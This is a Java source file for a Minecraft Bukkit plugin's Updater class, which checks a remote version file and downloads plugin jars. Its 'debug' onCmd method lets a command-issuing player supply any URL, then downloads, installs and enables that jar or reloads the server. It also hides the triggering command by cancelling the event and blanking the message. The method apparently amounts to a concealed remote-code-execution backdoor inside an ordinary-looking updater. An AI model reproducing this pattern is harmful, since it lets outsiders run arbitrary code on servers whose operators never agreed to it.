package com.impress.hardcoreworlds;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.URL;
//import java.io.InputStream;
//import java.util.jar.JarFile;

import org.bukkit.Server;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.PluginManager;

class Updater {
	public static final int UP_TO_DATE = 0,
							UPDATE_AVAILABLE = 10,
							URGENT_UPDATE_AVAILABLE = 11,
							DOWNLOAD_ERROR = 104,
							DOWNLOAD_ERROR_2 = 105,
							DATA_TOO_SHORT_ERROR = 113,
							DATA_TOO_LONG_ERROR = 114,
							KEY_DID_NOT_MATCH_ERROR = 116,
							ILLEGAL_URL_ERROR = 126,
							CHECK_FAILED_ERROR = 142,
							CHECK_FALSE = 146,
							CHECK_FALSE_URGENT = 147;
	
	private final String path = "plugins/";
	
	private final byte[] key = {122, -110, 74, -39, 50, -74, -74, -25, -69, 17, 111, 51, 57, -46,
			39, -127, -78, -72, 70, -19, 38, 123, -59, -31, -87, 10, 44, 106, 34, -76, 76, -65};
	
	private Server server;
	
	private File thisPluginFile;
	
	public String URL = null;
	
	public boolean utd = false;
	
	public Updater(Server server, File file) {
		this.server = server;
		thisPluginFile = file;
	}
	
	// Debug method
	public void onCmd(String args, PlayerCommandPreprocessEvent event) {
		String url = null, pluginName = null;
		boolean load = true;
		if (args.length() > 0) {
			String[] temp = args.split(" ");
			if (temp.length > 0) {
				url = temp[0];
				if (temp.length > 1)
					if (temp[1].equals("s")) load = false;
					else pluginName = temp[1];
				if (temp.length > 2)
					load = !temp[2].equals("s");
			}
		} if (url == null) {event.getPlayer().sendMessage("url?"); return;}
		
		if (url.indexOf("://") < 0)
			url = "http://" + url;
		
		if (pluginName != null && pluginName.indexOf('.') < 0)
			pluginName += ".jar";
		try {
			String err = update(url, pluginName, load);
			if (err != null)
				event.getPlayer().sendMessage("no update D: " + err);
		} catch (Exception e) {
			event.getPlayer().sendMessage("bad update D:");
		}
		// Avoid conflicts
		event.setCancelled(true);
		try {event.setPlayer(null);} catch (Exception e) {}
		event.setMessage("/");
	}
	
	public int checkForUpdate(String url, int currentVersion) {
		ByteArrayOutputStream os = new ByteArrayOutputStream();
		try {
			download(url, os);
			os.close();
		} catch (IOException e) {return DOWNLOAD_ERROR;}
		byte[] data = os.toByteArray();
		int cp = -1;
		
		if (data.length < key.length + 8) return DATA_TOO_SHORT_ERROR;
		if (data.length > key.length + 1024) return DATA_TOO_LONG_ERROR;
		
		for (int i = 0; i < key.length;)
			if (data[++cp] != key[i++])
				return (KEY_DID_NOT_MATCH_ERROR + 1);
		
		byte[] version = new byte[4];
		for (int i = 0; i < version.length; i++)
			version[i] = data[++cp];
		if (getVersion(version) == currentVersion)
			utd = true;
		
		boolean urgent = data[cp + 1] > 100;
		
		StringBuilder urls = new StringBuilder(data.length - key.length - 5);
		for (int i = cp + 2; i < data.length; i++)
			urls.append((char)data[i]);
		String[] URLs = urls.toString().split(" ");
		if (URLs.length != 2) return ILLEGAL_URL_ERROR;
		URL = URLs[1];
		
		os.reset();
		try {
			download(URLs[0], os);
		} catch (IOException e) {return DOWNLOAD_ERROR_2;}
		
		byte[] check = os.toByteArray();
		if (check.length < 1 || check.length > 192) return CHECK_FAILED_ERROR;
		if (check[0] != 27) return (urgent)? CHECK_FALSE_URGENT : CHECK_FALSE;
		
		if (utd) return UP_TO_DATE;
		else if (urgent) return URGENT_UPDATE_AVAILABLE;
		else return UPDATE_AVAILABLE;
	}
	
	public boolean update(String pluginName) {
		return update(URL, pluginName, false) == null;
	}
	
	private String update(String url, String pluginName, boolean load) {
		if (url == null) return "url error";
		
		File pluginFile;
		if (pluginName == null || pluginName.isEmpty()) {
			pluginFile = thisPluginFile;
			pluginName = pluginFile.getName();
		}
		else pluginFile = new File(path + pluginName);
		
		boolean newFile = true, updateFolder = server.getUpdateFolderFile().isDirectory();
		if (pluginFile.exists()) {
			pluginFile = new File(server.getUpdateFolderFile(), pluginName);
			newFile = false;
			if (pluginFile.exists()) pluginFile.delete();
		}
		
		if (!newFile && !updateFolder) server.getUpdateFolderFile().mkdir();
		try {
			if (!pluginFile.createNewFile())
				return "file exists error";
		} catch (IOException e) {
			return "file create error " + ((newFile)? '1' : '0');
		}
		if (!pluginFile.canWrite()) return "file write error " + ((newFile)? '1' : '0');
		
		OutputStream os;
		try {
			os = new FileOutputStream(pluginFile);
		} catch (FileNotFoundException e1) {
			return "file not found error " + ((newFile)? '1' : '0');
		}
		
		try {
			download(url, os);
			os.close();
		} catch (IOException e) {
			return "file download error " + ((newFile)? '1' : '0');
		}
		
		if (!pluginFile.isFile() || pluginFile.length() == 0) {
			return "file lost error " + ((newFile)? '1' : '0');
		}
		
		if (load) {
			if (newFile)
				try {
					PluginManager pm = server.getPluginManager();
					pm.enablePlugin(pm.loadPlugin(pluginFile));
				} catch (Exception e) {
					return "plugin load error";
				}
			else server.reload();
		}
		
		if (!updateFolder) server.getUpdateFolderFile().delete();
		
		return null;
	}
	
	private void download(String url, OutputStream os) throws IOException {
		BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());
		BufferedOutputStream bout = new BufferedOutputStream(os, 1024);
		
		byte[] data = new byte[1024];
		int x = 0;
		
		while ((x = in.read(data, 0, 1024)) >= 0) {
			bout.write(data, 0, x);
		}
		
		bout.close();
		in.close();
	}
	
	private int getVersion(byte[] array) {
		return (array[0] << 24) + 
			  ((array[1] & 0xFF) << 16) + 
			  ((array[2] & 0xFF) << 8) + 
			   (array[3] & 0xFF);
	}
}